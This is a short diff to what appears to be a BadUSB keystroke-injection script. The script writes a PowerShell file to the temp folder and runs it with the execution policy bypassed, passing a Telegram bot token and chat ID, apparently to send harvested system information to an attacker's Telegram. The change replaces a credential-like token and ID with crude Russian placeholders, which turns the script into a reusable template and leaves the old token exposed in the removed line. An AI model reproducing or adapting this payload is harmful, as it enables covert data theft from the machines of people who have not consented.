@@ -17,7 +17,7 @@ STRING $utf8Content | Out-File -FilePath $env:TEMP\info.ps1 -Encoding utf8
 ENTER
 DELAY 1000
 
-STRING powershell.exe -ExecutionPolicy Bypass -File $env:TEMP\info.ps1 -botToken '8061874944:AAEnjkHMLw1wh28CB88jhzLrOcQLtxCL6O4' -chatId '7470730369'
+STRING powershell.exe -ExecutionPolicy Bypass -File $env:TEMP\info.ps1 -botToken 'ВАШ СРАНЫЙ ТОКЕН БОТА' -chatId 'ВАШ АЙДИ ТГ'
 ENTER
 DELAY 2000
 
